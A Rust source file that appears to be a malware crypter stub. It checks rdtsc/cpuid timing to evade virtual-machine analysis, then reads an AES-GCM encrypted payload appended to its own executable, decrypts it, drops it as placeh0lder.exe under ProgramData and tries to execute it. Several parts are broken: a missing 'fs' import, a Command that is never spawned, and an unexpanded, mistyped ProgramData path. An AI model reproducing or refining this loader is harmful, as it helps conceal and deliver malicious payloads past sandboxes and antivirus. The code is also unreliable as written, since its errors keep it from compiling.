use aes_gcm::Aes256Gcm;
use aes_gcm::KeyInit;
use aes_gcm::aead::{AeadInPlace, generic_array::GenericArray};
use std::io::prelude::*;
use std::fs::File;
use std::env;
use std::io::SeekFrom;
use base64::{engine::general_purpose, Engine as _};
use core::arch::x86_64::{__cpuid, _rdtsc};
use std::process;
use std::error::Error;
use std::process::Command;

fn main() -> Result<(), Box<dyn Error>> {
    if rdt() {
        let _ = File::open("asdfasfefh543t9384ghrwe98f3e4h7gt548983rejfhgt7854rf04j853");
        process::exit(1);
        panic!("womp");
    } 

//Get the vars to decrypt data

    //Key base64 and decode
    let key: &'static str =env!("KEY");
    let key_dec = general_purpose::STANDARD.decode(&key)?;
    //Nonce base64 decode
    let nonce: &'static str= env!("NONCE");
    let nonce_dec = general_purpose::STANDARD.decode(&nonce)?;
 
    let size: &'static str = env!("SIZE");  


    //Convert to genarr
    let key_form = GenericArray::from_slice(&key_dec);
    let nonce_form = GenericArray::from_slice(&nonce_dec);
    let size_form: i64 = size.parse()?;
    
    //Open and read self
    let mut buffer = Vec::new();
    let mut file = File::open(env::current_exe()?)?;
    let _ = file.seek(SeekFrom::End(-1*size_form));
    let _ = file.read_to_end(&mut buffer)?; 
    
    //Decrypt
    let cipher = Aes256Gcm::new(&key_form);  
    let _ = cipher.decrypt_in_place(&nonce_form, b"", &mut buffer);
    
    let _ = fs::create_dir("%ProgramData%\\placeh0lder")?;
    let _ = env::set_current_dir("%ProgramData\\placeh0lder")?;

    let mut out = File::create("placeh0lder.exe")?;
    let _ = out.write_all(&buffer);
    let run = Command::new(".\\placeh0lder.exe")?;

    Ok(()) 

}

//rdtsc timing check 
fn rdt() -> bool {

    /*
        Main check, basicaly mesure time it takes to call cpuid and then see if there is a large
        variance in it
    */  

    let iter: u64 = 1000;
    let sum: u64 = (0..iter)
        .map(|_| unsafe {
            let start = _rdtsc();
            let _ = __cpuid(0);
            let end = _rdtsc();
            end - start
        })
        .sum();

    let avg = sum / iter;
    avg > 500
}


